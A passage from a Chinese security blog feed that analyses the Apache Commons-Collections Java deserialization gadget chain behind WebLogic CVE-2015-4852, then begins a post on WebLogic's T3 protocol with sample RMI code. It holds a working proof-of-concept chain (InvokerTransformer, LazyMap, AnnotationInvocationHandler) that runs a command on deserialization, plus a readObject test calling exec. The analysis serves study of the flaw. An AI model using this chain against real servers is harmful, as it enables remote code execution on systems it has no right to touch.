IllegalAccessException, InvocationTargetException, InstantiationException, IOException, IOException </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, String&gt; innerMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(), <span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(), <span class="title">handler</span>)</span>;</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(handler1);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要导入CommonsCollections，因为在之前的weblogic包里面没有找到，就去容器里面找到了，导入到项目里面即可。</p><p><img src="/imgs/image-20200722194206028.png" alt="image-20200722194206028"></p><p>在Transformer[]数组这里打上断点，开始一步一步分析这段代码</p><p><img src="/imgs/image-20200727145037589.png" alt="image-20200727145037589"></p><p>为了方便梳理，我们分为三部分进行分析：</p><p><img src="/imgs/image-20200728102258009.png" alt="image-20200728102258009"></p><h4 id="分析第一部分"><a href="#分析第一部分" class="headerlink" title="分析第一部分"></a>分析第一部分</h4><p>先生成Transformer数组，值分别是1个ConstantTransformer对象和3个InvokerTransformer对象</p><p><img src="/imgs/image-20200727145114068.png" alt="image-20200727145114068"></p><p>先看下Transformer，CTRL+H可以看到Transformer的继承实现关系，ConstantTransformer和InvokerTransformer都实现了Transformer，这里提一下ChainedTransformer也实现了Transformer，后面会用到。</p><p><img src="/imgs/image-20200727111550828.png" alt="image-20200727111550828"></p><p><a href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/Transformer.html" target="_blank" rel="noopener">Transformer</a>官方文档说明了这个接口主要是用来将一个对象转换为另一个对象</p><p><img src="/imgs/image-20200727144619522.png" alt="image-20200727144619522"></p><p>回到main，步入分析下每个对象的生成</p><p><img src="/imgs/image-20200727145122952.png" alt="image-20200727145122952"></p><p>ConstantTransformer(Object constantToReturn)，构造一个ConstantTransformer对象，并且设置对象的iConstant值为传入的参数值；重写transformer，返回构造函数传入的值，该值是class类型</p><p><img src="/imgs/image-20200727172157127.png" alt="image-20200727172157127"></p><p>InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)：构造函数获取方法名、参数类型、参数将其赋值给对象；transform(Object input) 获取类的方法名、参数类型、参数 <strong>采用<a href="/2020/06/12/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/">反射机制</a>调用该方法</strong></p><p><img src="/imgs/image-20200727185743443.png" alt="image-20200727185743443"></p><p>new Transformer[]完成，此时我们生成了一个transformer数组如下图</p><p><img src="/imgs/image-20200728111018511.png" alt="image-20200728111018511"></p><p>接着new一个ChainedTransformer，F7步入分析</p><p><img src="/imgs/image-20200727203858505.png" alt="image-20200727203858505"></p><p>ChainedTransformer(Transformer[] transformers)：将参数Transformer数组 赋值给对象；transform(Object object)将TransFormer数组的值 依次执行数组每个对象的transform()方法，也就是按照数组顺序去调用transform()，这里有一点容易遗漏，每次调用完transform()会赋值给Object作为下一次调用transform的参数。</p><p><img src="/imgs/image-20200727195322478.png" alt="image-20200727195322478"></p><p>以上我们在分析transformer接口的实现类时都分析了它的实现方法transform()，这个是后面要用到的</p><p>到这里new ChainedTransformer()完成</p><h4 id="分析第二部分"><a href="#分析第二部分" class="headerlink" title="分析第二部分"></a>分析第二部分</h4><p>我们继续往下，生成一个HashMap的实例innerMap，接着调用LazyMap.decorate(innerMap, chain)</p><p><img src="/imgs/image-20200727211240947.png" alt="image-20200727211240947"></p><p>这里我们看下HashMap和LazyMap，以一段代码来分析下。我们测试了两个实例，一个时LazyMap的Factory factory，一个是LazyMap的Transformer factory。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Factory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String arg[])</span> </span>&#123;</span><br><span class="line">        testLazyMap();</span><br><span class="line">        testLazyMapTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testLazyMap</span><span class="params">()</span> </span>&#123;   <span class="comment">//LazyMap的Factory factory测试</span></span><br><span class="line">        Factory valFactory = <span class="keyword">new</span> Factory() &#123;  <span class="comment">//创建一个工厂，实现create方法</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"Factory test"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Map lazyMap = LazyMap.decorate(<span class="keyword">new</span> HashMap(), valFactory);    <span class="comment">//当此lazyMap调用get(key)时，如果无此key则返回varFactory里create方法返回的值</span></span><br><span class="line">        lazyMap.put(<span class="string">"Map"</span>, <span class="string">"Maptest"</span>);</span><br><span class="line">        System.out.println(lazyMap.get(<span class="string">"Map"</span>));    <span class="comment">//有key对应的值时</span></span><br><span class="line">        System.out.println(lazyMap.get(<span class="number">123</span>));   <span class="comment">//无此key时自动调用varFactory里create方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testLazyMapTransformer</span><span class="params">()</span> </span>&#123;   <span class="comment">//LazyMap的Transformer factory测试</span></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> Transformer() &#123;<span class="comment">//创建一个transformer</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"Transformer test"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Map lazyMap = LazyMap.decorate(<span class="keyword">new</span> HashMap(), transformer);    <span class="comment">//当此lazyMap调用get(key)时，如果无此key则调用Transformer的transform方法</span></span><br><span class="line">        lazyMap.put(<span class="string">"Map"</span>, <span class="string">"Maptest"</span>);</span><br><span class="line">        System.out.println(lazyMap.get(<span class="string">"Map"</span>));    <span class="comment">//有key对应的值时</span></span><br><span class="line">        System.out.println(lazyMap.get(<span class="number">123</span>));   <span class="comment">//无此key时自动调用Transformer的transform方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20200728105558850.png" alt="image-20200728105558850"></p><p>从以上代码我们可以看出，在testLazyMapTransformer中，我们首先实现了Transformer，重写了transform方法，然后new了一个普通的HashMap，调用LazyMap.decorate(new HashMap(), transformer)，相当于提前定义了在hashMap中对没有key存在的情况的处理方法，就是调用Transformer.transform()。</p><p>现在我们回来刚刚的位置，调用LazyMap，步入分析LazyMap将innerMap和chain赋值给对象的属性map和factory，这里chain也是Transformer类型的。根据我们上面的分析，在调用LazyMap.decorate(innerMap, chain)的时候，就是定义了innerMap的无key处理方法：去自动调用chain.transform()。</p><p><img src="/imgs/image-20200727210203651.png" alt="image-20200727210203651"></p><p>到这里我们基本已经清晰了一半</p><ol><li>创建了一个Transform数组，这个数组的值是一个ContranTransformer和三个InvokerTransformer对象，ContranTransformer.transformer()可以返回class【这里是Runtime】，而InvokerTransformer可以通过反射机制去执行我们想要执行的方法，也就是getRuntime()、invoke、exec</li><li>new ChainedTransformer(transformers)创建一个ChainedTransformer实例，将Transform数组赋值给对象，ChainedTransformer.transform()将TransFormer数组的每个对象按照顺序依次执行数组每个对象的transform()方法</li><li>LazyMap.decorate(innerMap, chain)定义了innerMap的无key处理方法：去自动调用chain.transform()</li><li>完成以上三步，当我们获取LazyMap的key不存在时，就会去调用chain.transform()，从而依次4个对象的transform()，也就是下图 1 先获取类Runtime，2 getMethod(getRuntime)，3 invoke()，4 exec(“calc”)，因为前一个执行的结果会作为参数给下一个调用，所以最后会执行Runtime.getRuntime().exec(“calc”)</li></ol><p><img src="/imgs/image-20200727204747709.png" alt="image-20200727204747709"></p><h4 id="分析第三部分"><a href="#分析第三部分" class="headerlink" title="分析第三部分"></a>分析第三部分</h4><p>继续往下分析，Class.forName获取AnnotationInvocationHandler类，接着 clazz.getDeclaredConstructor获取构造方法sun.reflect.annotation.AnnotationInvocationHandler(java.lang.Class, java.util.Map)，设置可调用</p><p><img src="/imgs/image-20200727213721378.png" alt="image-20200727213721378"></p><p>下面就是动态代理部分，结合之前学习的<a href="/2020/06/13/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4%EF%BC%9A">动态代理</a>步骤来理解下</p><p><img src="/imgs/image-20200727231807422.png" alt="image-20200727231807422"></p><p>1、(InvocationHandler) cons.newInstance(Override.class, lazyMap)相当于sun.reflect.annotation.AnnotationInvocationHandler(Override.class, LazyMap)，构造了一个AnnotationInvocationHandler实例handler。学习动态代理时我们知道需要InvocationHandler的invoke()来进行代理，所以AnnotationInvocationHandler必须实现了InvocationHandler和重写Invoke方法。所以这里我们分析下AnnotationInvocationHandler的构造函数和Invoke方法。</p><p>AnnotationInvocationHandler(Override.class, lazyMap)构造方法将参数值赋给属性；</p><p>结合下面创建代理用的接口是Map，分析invoke()，重点是三步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var2是Map接口的某个方法</span></span><br><span class="line"><span class="comment">//获取方法名</span></span><br><span class="line">String var4 = var2.getName();</span><br><span class="line"><span class="comment">//获取方法的参数类型，var3是传入的参数</span></span><br><span class="line">Class[] var5 = var2.getParameterTypes();</span><br><span class="line"><span class="comment">//LazyMap.get(Map任一方法的名称)，这里是非常关键的一点，这一这里用到了LazyMap的get方法也就是get Key，上面分析过，key不存在时，就会去调用chain的transform()</span></span><br><span class="line">Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20200728145807642.png" alt="image-20200728145807642"></p><p>2、LazyMap.class.getClassLoader()指定LazyMap的类加载、LazyMap.class.getInterfaces()指定LazyMap的接口作为被代理的对象，那么就是LazyMap继承的接口Map的方法，所以其实这里被代理对象是Map的方法</p><p>3、Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler)：结合上面1、2步骤的分析其实很清楚了，用handler的invoke()代理Map接口的方法，而invoke()中有关键的一步this.memberValues.get(var4)，会调用LazyMap.get(Map任一方法的名称)，从而调用chain.transform()。所以当我们调用mapProxy的被代理方法，也就是Map的任一方法就会去触发调用invoke()从而调用chain.transform()</p><p>4、InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class, mapProxy)：创建一个实例handler1，这时将mapProxy赋值给this.memberValues</p><p>5、下面就是序列化和反序列，在这里我困惑了好久，不知道到底怎么去调用的Map的某个方法来触发的。ysoserial的Gadget chain里面有AnnotationInvocationHandler.readObject，没理解怎么就调用了AnnotationInvocationHandler.readObject()，看了E_Bwill大佬的<a href="https://paper.seebug.org/312/#6-java-apache-commonscollections-rce" target="_blank" rel="noopener">深入理解 JAVA 反序列化漏洞</a>我终于明白了。</p><p>看下面的这个例子，我们要进行序列化的对象如果重写了readObject()方法，在反序列化时会调用重写后的readObject()。这也就解释了为什么Object obj = (Object) ois.readObject()这里会调用AnnotationInvocationHandler.readObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadObjectTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//创建一个ReadObjectOverride对象</span></span><br><span class="line">        ReadObjectOverride readObjectOverride = <span class="keyword">new</span> ReadObjectOverride();</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(readObjectOverride);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReadObjectOverride</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而AnnotationInvocationHandler.readObject()里面调用了我们刚刚分析的触发点Map接口的方法也就是Map.entrySet()。</p><p><img src="/imgs/image-20200728165240568.png" alt="image-20200728165240568"></p><p>梳理下：</p><ol><li>首先利用ChainedTransformer的transform()的循环调用特性创建了exec执行链chain</li><li>利用LazyMap的decorate()定义了get key不存在时的调用Transformer工厂chain.transform()</li><li>找到条件去get(不存在的key)从而调用工厂，这个条件就是动态代理AnnotationInvocationHandler.invoke()</li><li>创建动态代理来代理Map的所有接口，只要调用Map的接口就会去调用代理方法AnnotationInvocationHandler.invoke()</li><li>找到触发点触发代理invoke()，就是AnnotationInvocationHandler.readObject()，因为readObject()调用了Map接口entrySet()</li></ol><h2 id="0x03-思考和启发"><a href="#0x03-思考和启发" class="headerlink" title="0x03 思考和启发"></a>0x03 思考和启发</h2><p>在前言的问题“为什么CommonsCollections<strong>能够引起命令执行</strong>，需要什么条件？有哪些类是类似的？”我们解决了前一部分问题，哪些类是类似的，可以被用作反序列来执行命令，需要我们去寻找。</p><p>通过上面的分析也给我们后续学习或者挖洞提供了一点思路：首先我们需要找一个接收<strong>序列化数据的入口</strong>，便于我们传序列化数据，传入后程序需要进行<strong>反序列化</strong>；然后我们需要找到能够<strong>执行命令的利用链</strong>，并且这个利用链是<strong>不被服务器拦截</strong>的。</p><p> 还是那句话，纸上得来终觉浅， 绝知此事要躬行。</p><h2 id="0x04-参考链接："><a href="#0x04-参考链接：" class="headerlink" title="0x04 参考链接："></a>0x04 参考链接：</h2><p><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#commons" target="_blank" rel="noopener">What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.</a><br><a href="https://www.cnblogs.com/ph4nt0mer/p/11772709.html" target="_blank" rel="noopener">IDEA+docker，进行远程漏洞调试（weblogic）</a><br><a href="https://www.anquanke.com/post/id/195865" target="_blank" rel="noopener">以Commons-Collections为例谈Java反序列化POC的编写</a><br><a href="https://www.cnblogs.com/ssooking/p/5875215.html" target="_blank" rel="noopener">Java反序列化漏洞分析    </a><br><a href="https://blog.csdn.net/simonnews/article/details/105765017" target="_blank" rel="noopener">Weblogic漏洞Java反序列化CVE-2015-4852解析</a><br><a href="https://www.iteye.com/blog/shukuiyan-2298947" target="_blank" rel="noopener">BidiMap-MultiMap-LazyMap</a><br><a href="https://paper.seebug.org/312/#6-java-apache-commonscollections-rce" target="_blank" rel="noopener">深入理解 JAVA 反序列化漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> WebLogic </category>
          
          <category> T3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebLogic </tag>
            
            <tag> CVE-2015-4852 </tag>
            
            <tag> T3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic系列漏洞学习之T3：T3协议</title>
      <link href="2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/"/>
      <url>2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>因为涉及RMI和JNDI的基础知识，推荐先阅读下：</p><p><a href="/2020/06/14/Java%20RMI/">RMI</a></p><p><a href="/2020/06/14/JNDI/">JNDI</a></p><h2 id="0x01-什么是T3协议？"><a href="#0x01-什么是T3协议？" class="headerlink" title="0x01 什么是T3协议？"></a>0x01 什么是T3协议？</h2><p>T3也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。借助这种方法，基于Java的客户端可以根据服务器方需求使用多种RMI对象，但仍使用一个套接字和一条线程。</p><p>WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。</p><h2 id="0x02-怎么调用T3服务？"><a href="#0x02-怎么调用T3服务？" class="headerlink" title="0x02 怎么调用T3服务？"></a>0x02 怎么调用T3服务？</h2><p>参考<a href="https://docs.oracle.com/middleware/1213/wls/WLRMI/rmi_imp.htm#WLRMI233" target="_blank" rel="noopener">官方</a>给的例子写个测试例子，该例子将HelloServer服务绑定在jndi上进行管理，方便调用t3的HelloServer服务。</p><p>首先创建Maven项目</p><p><img src="/imgs/image-20200721155118447.png" alt="image-20200721155118447"></p><p>填写信息，选择目录，finish创建完成</p><p><img src="/imgs/image-20200721155152125.png" alt="image-20200721155152125"></p><p>Hello.java：Hello继承Remote接口</p><figure class="highlight java"><figcaption><span>Hello.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic.t3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HelloImpl.java:实现远程接口Hello，Hello服务的具体信息</p><figure class="highlight java"><figcaption><span>HelloImpl.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic.t3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Server.java:创建HelloImpl类的实例并在JNDI registry中以HelloServer注册。</p><figure class="highlight java"><figcaption><span>Server.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic.t3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The factory to use when creating our initial context</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String JNDI_FACTORY=<span class="string">"weblogic.jndi.WLInitialContextFactory"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create an instance of the Implementation class</span></span><br><span class="line"><span class="comment">     * and bind it in the registry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = getInitialContext(<span class="string">"t3://192.168.116.140:7001"</span>);</span><br><span class="line">            ctx.bind(<span class="string">"HelloServer"</span>, <span class="keyword">new</span> HelloImpl());</span><br><span class="line">            System.out.println(<span class="string">"HelloImpl created and bound to the JNDI"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">"HelloImpl.main: an exception occurred!"</span>);</span><br><span class="line">            e.printStackTrace(System.out);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Creates the Initial JNDI Context */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client.java：找到HelloServer服务然后去调用</p><figure class="highlight java"><figcaption><span>Client.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic.t3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span 